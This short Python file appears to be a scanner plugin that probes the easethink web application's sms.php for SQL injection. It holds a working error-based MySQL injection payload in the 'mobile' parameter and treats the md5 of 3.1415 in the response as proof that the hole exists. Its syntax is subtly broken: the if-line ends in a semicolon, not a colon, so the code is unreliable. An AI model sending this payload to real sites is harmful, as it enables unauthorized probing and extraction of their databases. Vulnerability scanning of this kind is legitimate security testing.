# -*- coding: utf-8 -*-

import requests

def run(target):
    "easethink_SQLInjection(sms.php)"
    results = []
    url = "http://" + target + "sms.php?act=do_subscribe_verify&mobile='and(select 1 from(select count(*),concat((select (select (select concat(0x7e,md5(3.1415),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23"
    try:
        r = requests.get(url,timeout=5)
    except Exception:
        pass
    else:
        r.close()
        if "63e1f04640e83605c1d177544a5a0488" in r.text;
           results.append(url)

    return results
